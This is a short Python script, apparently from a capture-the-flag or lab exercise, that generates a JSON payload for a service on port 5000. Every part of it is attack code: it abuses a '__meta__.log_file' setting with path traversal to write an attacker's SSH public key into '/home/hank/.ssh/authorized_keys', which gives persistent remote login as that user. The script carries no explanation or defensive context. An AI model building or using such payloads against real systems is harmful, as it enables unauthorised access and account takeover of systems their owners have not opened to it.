#!/usr/bin/env python3
"""Emit contract.json that writes an SSH pubkey via :5000 __meta__.log_file."""
import json
import sys
from pathlib import Path

if len(sys.argv) != 2:
    sys.exit(f"usage: {sys.argv[0]} <ed25519.pub>")

pub = Path(sys.argv[1]).read_text().strip()
doc = {
    "logic": {"claim": "allow"},
    "debug": "True",
    "hooks": {"on_claim": "log"},
    "__meta__": {
        "log_file": "../../../../home/hank/.ssh/authorized_keys",
        "log_content": {"on_claim": "\n" + pub},
    },
}
json.dump(doc, sys.stdout, indent=2)
sys.stdout.write("\n")
